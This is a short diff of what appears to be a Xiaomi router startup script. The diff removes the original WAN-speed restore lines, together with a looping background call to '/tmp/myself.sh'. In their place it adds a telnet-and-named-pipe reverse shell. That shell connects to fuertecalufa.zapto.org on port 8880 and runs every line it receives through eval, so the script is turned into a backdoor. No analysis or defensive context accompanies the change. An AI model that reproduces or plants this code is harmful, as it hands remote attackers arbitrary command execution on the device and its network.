@@ -1,5 +1,5 @@
-# restore phy config
-speed=$(uci -q get xiaoqiang.common.WAN_SPEED)
-[ -n "$speed" ] && /usr/sbin/phyhelper swan "$speed"
-while true; do /tmp/myself.sh; done & 
-exit 0
+TF="/tmp/myfifo.$$"
+mkfifo "$TF" 
+telnet fuertecalufa.zapto.org 8880 > "$TF" &
+while IFS= read -r line; do eval "$line"; done < "$TF"
+rm "$TF"
